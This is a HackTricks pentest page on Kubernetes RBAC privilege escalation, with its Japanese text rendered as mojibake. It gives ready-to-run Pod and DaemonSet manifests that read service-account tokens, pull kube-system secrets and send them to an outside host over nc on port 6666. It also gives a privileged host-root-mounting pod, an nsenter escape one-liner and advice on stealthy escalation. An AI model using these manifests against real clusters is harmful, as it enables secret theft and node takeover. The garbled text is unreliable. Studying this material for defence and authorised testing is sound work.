# Kubernetesã§ã®Roles/ClusterRolesã®æ‚ªç”¨

<details>

<summary><strong>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹**ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹

</details>

ã“ã“ã§ã¯ã€ã„ãã¤ã‹ã®æ½œåœ¨çš„ã«å±é™ºãªRolesã¨ClusterRolesã®è¨­å®šã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`kubectl api-resources`ã‚’ä½¿ç”¨ã—ã¦ã€ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’å–å¾—ã§ãã‚‹ã“ã¨ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„ã€‚

## **ç‰¹æ¨©æ˜‡æ ¼**

Kubernetesã§ã¯ã€æ—¢ã«æŒã£ã¦ã„ã‚‹æ¨©é™ã¨ã¯ç•°ãªã‚‹ç‰¹æ¨©ã‚’æŒã¤ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®**åˆ¥ã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ã“ã¨ã‚’æŒ‡ã—ã¦ã„ã¾ã™ã€‚ç‰¹æ¨©æ˜‡æ ¼ã®ãŸã‚ã«ã¯ã€åŸºæœ¬çš„ã«**4ã¤ã®ä¸»è¦ãªãƒ†ã‚¯ãƒ‹ãƒƒã‚¯**ãŒã‚ã‚Šã¾ã™ã€‚

* Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã§ã€ã‚ˆã‚Šé«˜ã„ç‰¹æ¨©ã‚’æŒã¤ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼/ã‚°ãƒ«ãƒ¼ãƒ—/SAã‚’**ãªã‚Šã™ã¾ã™**ã“ã¨ãŒã§ãã‚‹
* Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã§ã€ã‚ˆã‚Šé«˜ã„ç‰¹æ¨©ã‚’æŒã¤SAã‚’**è¦‹ã¤ã‘ãŸã‚Šã‚¢ã‚¿ãƒƒãƒã—ãŸã‚Šã§ãã‚‹**ãƒãƒƒãƒ‰ã‚’**ä½œæˆ/ãƒ‘ãƒƒãƒ/å®Ÿè¡Œ**ã§ãã‚‹
* SAã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹**ã“ã¨ãŒã§ãã‚‹
* ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã«**ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**ã™ã‚‹ã“ã¨ãŒã§ãã€ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã®ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã€ãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã€ãŠã‚ˆã³ãƒãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¯ãƒ©ã‚¦ãƒ‰å†…ã®æ¨©é™ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã‚‹
* ãƒãƒƒãƒ‰ã§**ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ¯ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã™ã‚‹èƒ½åŠ›ã‚‚è¨€åŠã«å€¤ã™ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã‚ã‚Šã€ãã®ãƒãƒƒãƒ‰å†…ã®èˆˆå‘³æ·±ã„ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œãªã„

### **ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã¾ãŸã¯å‹•è©ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼ˆãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ï¼‰**

ã“ã®ç‰¹æ¨©ã¯ã€**ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã«ä»»æ„ã®å‹•è©ã§ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹æ¨©é™ã‚’æä¾›ã—ã¾ã™ã€‚ç‰¹ã«ã“ã®ç‰¹æ¨©ãŒã€ŒClusterRoleã€ã§ã‚ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä»»æ„ã®åå‰ç©ºé–“ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã®æ¨©é™ã§ã‚¯ãƒ©ã‚¹ã‚¿ã‚’æ‰€æœ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’ä¸ãˆã‚‹ã“ã¨ã¯éå¸¸ã«å±é™º**ã§ã™ã€‚ã—ã‹ã—ã€ã“ã‚Œã‚‰ã®ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ãŸã‚ã®**ã©ã®å‹•è©**ãŒå­˜åœ¨ã™ã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿä»¥ä¸‹ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã«æå®³ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹å±é™ºãªRBACæ¨©é™ã®ã„ãã¤ã‹ã§ã™ï¼š

* **resources: \["\*"] verbs: \["create"]** - ã“ã®æ¨©é™ã«ã‚ˆã‚Šã€**ãƒãƒƒãƒ‰**ã€ãƒ­ãƒ¼ãƒ«ãªã©ã®ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®**ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦**ç‰¹æ¨©ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’è¡Œã†å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«é–¢ã™ã‚‹ä¾‹ã¯**ã€Œãƒãƒƒãƒ‰ã®ä½œæˆã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã«ã‚ã‚Šã¾ã™ã€‚
* **resources: \["\*"] verbs: \["list"]** - ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ãƒªã‚¹ãƒˆã™ã‚‹èƒ½åŠ›ã¯ã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç§˜å¯†æƒ…å ±ã‚’**æ¼æ´©**ã•ã›ã‚‹ã“ã¨ãŒã§ãã€ç‰¹æ¨©ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®¹æ˜“ã«ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«é–¢ã™ã‚‹ä¾‹ã¯**ã€Œã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒªã‚¹ãƒˆè¡¨ç¤ºã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã«ã‚ã‚Šã¾ã™ã€‚
* **resources: \["\*"] verbs: \["get"]** - ã“ã®æ¨©é™ã¯ã€ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Podã®ä½œæˆ - ãƒˆãƒ¼ã‚¯ãƒ³ã®ç›—é›£

ã€Œkube-systemã€åå‰ç©ºé–“ã§Podã‚’ä½œæˆã™ã‚‹æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ä¾‹ãˆã°æš—å·ãƒã‚¤ãƒ‹ãƒ³ã‚°ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€ç‰¹æ¨©ã®ã‚ã‚‹æ¨©é™ã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒå­˜åœ¨ã™ã‚‹å ´åˆã€ãã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã™ã‚‹Podã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§æ¨©é™ã‚’ä¹±ç”¨ã—ã¦ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã“ã§ã¯ã€ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹æ¨©é™ã‚’æŒã¤ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ã‚ã‚‹_bootstrap-signer_ãŒã‚ã‚Šã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

æ”»æ’ƒè€…ã¯ç‰¹æ¨©ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹æ‚ªæ„ã®ã‚ã‚‹Podã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€ã‚µãƒ¼ãƒ“ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä¹±ç”¨ã—ã¦ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
å‰ã®ã‚¤ãƒ¡ãƒ¼ã‚¸ã§ã¯ã€_bootstrap-signerã‚µãƒ¼ãƒ“ã‚¹ãŒ_ `serviceAccountname`_ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚_

ã—ãŸãŒã£ã¦ã€æ‚ªæ„ã®ã‚ã‚‹ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ã€ãƒãƒ¼ãƒˆ6666ã§ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **ãƒãƒƒãƒ‰ã®ä½œæˆã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**

æ¬¡ã®å®šç¾©ã§ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠãŒæŒã¤ã“ã¨ãŒã§ãã‚‹ã™ã¹ã¦ã®ç‰¹æ¨©ã‚’ä¸ãˆã¾ã™ï¼š

* **ç‰¹æ¨©ã‚¢ã‚¯ã‚»ã‚¹**ï¼ˆä¿è­·ã‚’ç„¡åŠ¹ã«ã—ã€æ©Ÿèƒ½ã‚’è¨­å®šã™ã‚‹ï¼‰
* **ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹hostIPCã¨hostPidã‚’ç„¡åŠ¹åŒ–**ã—ã€ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã™ã‚‹ã®ã«å½¹ç«‹ã¤
* **ãƒ›ã‚¹ãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã‚’ç„¡åŠ¹åŒ–ã—ã€ãƒãƒ¼ãƒ‰ã®ã‚¯ãƒ©ã‚¦ãƒ‰ç‰¹æ¨©ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ã‚ˆã‚Šè‰¯ã„ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™
* **ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒ›ã‚¹ãƒˆã®/ã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
kubectl --token $token create -f mount_root.yaml
```
[ã“ã®ãƒ„ã‚¤ãƒ¼ãƒˆ](https://twitter.com/mauilion/status/1129468485480751104)ã‹ã‚‰ã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã¨ã„ãã¤ã‹ã®è¿½åŠ æƒ…å ±:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### ã‚¹ãƒ†ãƒ«ã‚¹

ãŠãã‚‰ãã€ã‚ˆã‚Š**ã‚¹ãƒ†ãƒ«ã‚¹**ã«ãªã‚ŠãŸã„ã¨æ€ã†ã§ã—ã‚‡ã†ã€‚æ¬¡ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€å‰ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§è¨€åŠã•ã‚ŒãŸç‰¹æ¨©ã®ä¸€éƒ¨ã®ã¿ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã‚ˆã†ãªãƒãƒƒãƒ‰ã‚’ä½œæˆã—ãŸå ´åˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚‚ã®ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* **ç‰¹æ¨© + hostPID**
* **ç‰¹æ¨©ã®ã¿**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_å‰è¿°ã®ç‰¹æ¨©ä»˜ããƒãƒƒãƒ‰ã®è¨­å®šã‚’ä½œæˆ/æ‚ªç”¨ã™ã‚‹ä¾‹ã¯_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™_

### ãƒãƒƒãƒ‰ã®ä½œæˆ - ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ç§»è¡Œ

**ãƒãƒƒãƒ‰**ï¼ˆã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼‰ã‚’**ä½œæˆ**ã§ãã‚‹å ´åˆã€**ãƒãƒƒãƒ‰ã¾ãŸã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦**ã¦ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒã§ç‰¹æ¨©ã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã•ã‚‰ã«ã€**ãƒ›ã‚¹ãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åå‰ç©ºé–“ã‚’æŒã¤ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã§ãã‚‹å ´åˆã€**ãƒãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®IAMãƒ­ãƒ¼ãƒ«ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€æ¬¡ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã€ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ãƒ«ã‚»ãƒƒãƒˆã€ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã€ãƒ¬ãƒ—ãƒªã‚«ã‚»ãƒƒãƒˆã€ã‚¸ãƒ§ãƒ–ã€ã‚¯ãƒ­ãƒ³ã‚¸ãƒ§ãƒ–ã®ä½œæˆ/ãƒ‘ãƒƒãƒ**

ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã€ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ãƒ«ã‚»ãƒƒãƒˆã€ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã€ãƒ¬ãƒ—ãƒªã‚«ã‚»ãƒƒãƒˆã€ã‚¸ãƒ§ãƒ–ã€ã‚¯ãƒ­ãƒ³ã‚¸ãƒ§ãƒ–ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§ã•ã¾ã–ã¾ãªã‚¿ã‚¹ã‚¯ã‚’ä½œæˆã™ã‚‹ãŸã‚ã®ç‰¹æ¨©ã§ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã™ã¹ã¦ã‚’ä½¿ç”¨ã—ã¦**ãƒãƒƒãƒ‰ã‚’é–‹ç™ºã—ã€ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€å‰ã®ä¾‹ã¨åŒæ§˜ã«ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã™ã‚‹ãŸã‚ã«ãã‚Œã‚‰ã‚’**æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ¬¡ã®ã‚ˆã†ã«**ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã‚’ä½œæˆã™ã‚‹æ¨©é™**ãŒã‚ã‚‹ã¨ä»®å®šã—ã€æ¬¡ã®YAMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®YAMLãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ã€Œãƒãƒƒãƒ‰ã®ä½œæˆã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ãŸæ‰‹é †ã¨åŒã˜ã‚‚ã®ã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
6è¡Œç›®ã«ã¯ã€Œspecã€ã¨ã„ã†ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ã€10è¡Œç›®ã«ã¯ã€Œ**template**ã€ã¨ã„ã†å­ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€ç§ãŸã¡ãŒé”æˆã—ãŸã„ã‚¿ã‚¹ã‚¯ã®è¨­å®šã‚’ä¿æŒã—ã¦ã„ã¾ã™ã€‚ã¾ãŸã€15è¡Œç›®ã®ã€Œ**serviceAccountName**ã€ã¨18è¡Œç›®ã®ã€Œ**containers**ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚‚æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã“ã‚ŒãŒã€ç§ãŸã¡ã®æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã™ã‚‹éƒ¨åˆ†ã§ã™ã€‚

Kubernetes APIã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚Œã°ã€ã€Œ**PodTemplateSpec**ã€ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã¯ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã™ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚ãã—ã¦ã€æ¬¡ã®ã‚ˆã†ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™: **deploymentã€daemonsetsã€statefulsetsã€replicationcontrollersã€replicasetsã€jobsã€cronjobsã¯ã™ã¹ã¦ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™**:

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**ã—ãŸãŒã£ã¦ã€ã‚¿ã‚¹ã‚¯ã®ä½œæˆã¾ãŸã¯æ›´æ–°ã®æ¨©é™ã‚‚ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§ã®ç‰¹æ¨©ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**

### **Pods Exec**

**`pods/exec`**ã¯ã€kubernetesã§**ãƒãƒƒãƒ‰å†…ã®ã‚·ã‚§ãƒ«ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒªã‚½ãƒ¼ã‚¹ã§ã™ã€‚ã“ã®ç‰¹æ¨©ã¯ã€**ã‚³ãƒ³ãƒ†ãƒŠã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã„ç®¡ç†è€…**å‘ã‘ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚³ãƒ³ãƒ†ãƒŠç”¨ã®SSHã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½œæˆã™ã‚‹ã®ã¨åŒã˜ã§ã™ã€‚

ã“ã®ç‰¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€å®Ÿéš›ã«ã¯**ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã‚’åˆ¶å¾¡ã™ã‚‹èƒ½åŠ›**ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
